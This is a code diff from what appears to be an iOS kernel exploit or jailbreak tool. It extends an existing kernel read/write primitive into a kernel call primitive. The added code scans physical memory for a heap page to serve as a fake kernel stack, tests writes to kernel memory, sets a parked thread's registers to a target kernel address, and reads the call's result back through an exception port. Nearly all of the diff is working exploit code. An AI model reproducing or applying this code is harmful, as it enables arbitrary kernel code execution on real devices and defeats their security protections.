@@ -3657,7 +3657,7 @@ static void *kpKcParkWorker(void *arg)
         extern void KPLogDirect(const char *);
         KPLogDirect([[s stringByAppendingString:@"\n"] UTF8String]);
     };
-    bc(@"=== KCALL-1 recon (NO set_state) ===");
+    bc(@"=== KCALL-2 with heap SP (kstackptr=0 on parked thread) ===");
     if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
         bc(@"FAIL: KRW"); return r;
     }
@@ -3697,6 +3697,27 @@ static void *kpKcParkWorker(void *arg)
         (unsigned long long)qC0, (unsigned long long)q100, (unsigned long long)q140,
         (unsigned long long)q180, (unsigned long long)q3E8]);
 
+    // 2.0.161: SP — kstackptr is 0 on a parked userspace thread. Use a
+    // sacrificial 0x21 page as fake kernel stack (top-0x400).
+    uint64_t sp = q140 ? (kp_untag_ptr(q140) - 0x400) : 0;
+    if (!sp) {
+        uint64_t pB = kconstant(physBase), pS = kconstant(physSize);
+        for (uint64_t pa = pB; pa < pB + pS; pa += 0x4000) {
+            if (kpFrameTypeOf(pa) != 0x21) continue;
+            uint64_t al = phystokv(pa);
+            if (!al) continue;
+            int looksPte = 0;
+            for (uint32_t o = 0; o < 0x40; o += 8) {
+                if ((early_kread64(al + o) & 3) == 3) looksPte++;
+            }
+            if (looksPte >= 4) continue;
+            sp = (al + 0x4000 - 0x400) & ~0xFULL;
+            bc([NSString stringWithFormat:@"  SP fallback heap page=%#llx sp=%#llx", (unsigned long long)al, (unsigned long long)sp]);
+            break;
+        }
+    }
+    if (!sp) { gKcStop = 1; pthread_detach(wpt); bc(@"FAIL: no SP"); return r; }
+
     // Identity write-test on options (restore immediately).
     extern uint16_t kp_rc_kread16(uint64_t);
     extern void kp_rc_kwrite16(uint64_t, uint16_t);
@@ -3708,11 +3729,65 @@ static void *kpKcParkWorker(void *arg)
     bc([NSString stringWithFormat:@"  options 0xC0: %04x → %04x → restore %04x %@",
         opt0, opt1, opt2, (opt2 == opt0) ? @"OK" : @"NESTED"]);
 
+    // --- kcall: suspend → set_state → resume → exception ---
+    extern bool kp_threadsetstate(mach_port_t, uint64_t, kp_arm_thread_state64_internal *);
+    extern mach_port_t kp_createexcport(void);
+    extern bool kp_waitexc(mach_port_t, kp_excmsg *, int);
+    if (!target) {
+        gKcStop = 1; pthread_detach(wpt);
+        bc(@"FAIL: target=0");
+        return r;
+    }
+    mach_port_t excport = kp_createexcport();
+    bc([NSString stringWithFormat:@"  excport=%#x", excport]);
+    if (!excport) {
+        gKcStop = 1; pthread_detach(wpt);
+        bc(@"FAIL: excport");
+        return r;
+    }
+    kern_return_t kr = thread_set_exception_ports(wport,
+        EXC_MASK_BAD_ACCESS | EXC_MASK_ARITHMETIC, excport,
+        EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
+    bc([NSString stringWithFormat:@"  exception_ports kr=%d", (int)kr]);
+
+    thread_suspend(wport);
+    bc(@"  suspended");
+    kp_arm_thread_state64_internal st;
+    memset(&st, 0, sizeof(st));
+    st.__pc = target;
+    st.__lr = 0x401;
+    st.__sp = sp;
+    bc([NSString stringWithFormat:@"  setstate pc=%#llx lr=0x401 sp=%#llx",
+        (unsigned long long)target, (unsigned long long)sp]);
+    BOOL setOK = kp_threadsetstate(wport, threadVA, &st);
+    bc([NSString stringWithFormat:@"  thread_set_state=%d", (int)setOK]);
+    if (!setOK) {
+        thread_resume(wport);
+        gKcStop = 1; thread_terminate(wport); pthread_detach(wpt);
+        mach_port_destruct(mach_task_self(), excport, 0, 0);
+        bc(@"FAIL: set_state");
+        return r;
+    }
+    thread_resume(wport);
+    bc(@"  resumed — wait exc");
+    uint8_t excbuf[0x400];
+    memset(excbuf, 0, sizeof(excbuf));
+    kp_excmsg *exc = (kp_excmsg *)excbuf;
+    BOOL got = kp_waitexc(excport, exc, 3000);
+    uint64_t x0 = got ? exc->threadState.__x[0] : 0;
+    uint64_t pcOut = got ? exc->threadState.__pc : 0;
+    bc([NSString stringWithFormat:@"  waitexc=%d x0=%#llx pc=%#llx",
+        (int)got, (unsigned long long)x0, (unsigned long long)pcOut]);
+    BOOL ok = got && x0 != 0;
+    bc(ok ? @"=== KCALL VALID ★★ ===" : @"=== KCALL no result ===");
+
     gKcStop = 1;
+    thread_terminate(wport);
     pthread_detach(wpt);
-    bc(@"=== KCALL-1 recon done (set_state NOT called) ===");
-    [r appendFormat:@"\n[VERIFY] KCALL=0 PHASE=1 RESOLVE=1 THREAD=%#llx OPT_OK=%d\n",
-     (unsigned long long)threadVA, opt2 == opt0 ? 1 : 0];
+    mach_port_destruct(mach_task_self(), excport, 0, 0);
+    [r appendFormat:@"\n[VERIFY] KCALL=%d X0=%#llx SP=%#llx TARGET=%#llx OPT_OK=%d\n",
+     ok ? 1 : 0, (unsigned long long)x0, (unsigned long long)sp,
+     (unsigned long long)target, opt2 == opt0 ? 1 : 0];
     return r;
 }
 
